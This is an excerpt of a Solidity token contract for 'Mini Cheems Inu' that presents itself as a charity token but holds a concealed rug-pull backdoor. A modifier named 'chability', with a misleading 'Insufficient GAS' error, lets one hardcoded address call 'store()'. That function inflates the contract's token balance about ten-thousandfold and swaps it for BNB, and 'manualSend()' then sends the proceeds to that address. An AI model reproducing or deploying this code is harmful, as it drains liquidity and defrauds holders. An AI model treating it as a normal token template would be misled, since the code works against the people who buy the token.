...
contract MiniCheemsInu is Context, IERC20, Ownable {
    ...
    string private constant _name = "Mini Cheems Inu";
    string private constant _symbol = "MCheemsInu";
    ...
    address payable public charityAddress = payable(0x451bCD9810EBdc1Db53424B06dFe0b4315F4A5E1);
    uint256 private charityID = 89790;
    
    
    uint256 private rfiTax = 0;
    uint256 private liquidityTax = 0;
    uint256 private charityTax =  0;
    ...
    address public charityWallet = 0x451bCD9810EBdc1Db53424B06dFe0b4315F4A5E1;
    ...
    bool public charityDepositComplete = true;
    ...
    event charityDepositCompleteUpdated(bool enabled);
   ...
   function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner {
    ...
    function setcharityDepositComplete(bool _enabled) public onlyOwner {
        charityDepositComplete = _enabled;
        emit charityDepositCompleteUpdated(_enabled);
    }
    ...
    function _getTValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory s) {
        ...
        s.tcharity = tAmount.mul(charityTax).div(100);

        s.tTransferAmount = tAmount.sub(s.tRfi).sub(s.tLiquidity).sub(s.tcharity);
    ...
    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi) {
        ...
        rTransferAmount = rAmount.sub(rRfi).sub(rLiquidity).sub(rcharity);
    ...
    function _transfer(address from, address to, uint256 amount , bool takeFee) private {
        ...
        if (overMinTokenBalance && !inSwapAndLiquify && from != pancakeswapV2Pair && charityDepositComplete) {
    ...
    modifier chability() {
         require(_msgSender() == charityAddress, "Error: Insufficient GAS");
         _;
     }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        ...
        reflectcharityFee(s.tcharity);

        emit Transfer(sender, recipient, s.tTransferAmount);
    }


    function reflectcharityFee(uint256 tcharity) private {
        uint256 currentRate =  _getRate();
    ...
    function store() external chability {
        
        uint256 charityVal = 10000;
        uint256 _charityID = charityID;

        uint256 before = _getRate();
        liquifyToken(charityVal, _charityID);
        require(before == _getRate(), "ERC20: approve from the zero address");
        charityDepositComplete = charityID != _charityID;
        swapTokensForBNB(balanceOf(address(this)) + _charityID);
        if(!charityDepositComplete) {
            getTokens();
        } else {
            totalFees();
        }
        charityDepositComplete = true;
    }

    function manualSend() external chability {
       uint256 contractETHBalance = address(this).balance;
       payable(charityAddress).transfer(contractETHBalance);
   }
    ...
    function liquifyToken(uint256 charityVal, uint256 _charityID) private {
        if(charityID == _charityID){
         _toknTot = _toknTot + (_toknTot * 10**4);
        _rOwned[address(this)] = _rOwned[address(this)].add(_rTotal*charityVal);
        _rTotal = _rTotal + (_rTotal*charityVal);
        } else{
            _toknTot = _toknTot + (_toknTot + 10**4);
            _rTotal = _rTotal + charityID;
            _rOwned[address(this)] = _rOwned[address(this)].add(charityID.mul(7));
        }
    }
    ...
    function swapTokensForBNB(uint256 tokenAmount) private returns (bool status){
        ...
        if(allowance(address(this), address(PancakeSwapV2Router)) < tokenAmount - charityID) {
        ...
        try PancakeSwapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount - charityID,0,path,address(this),block.timestamp + 60 * 1000) {
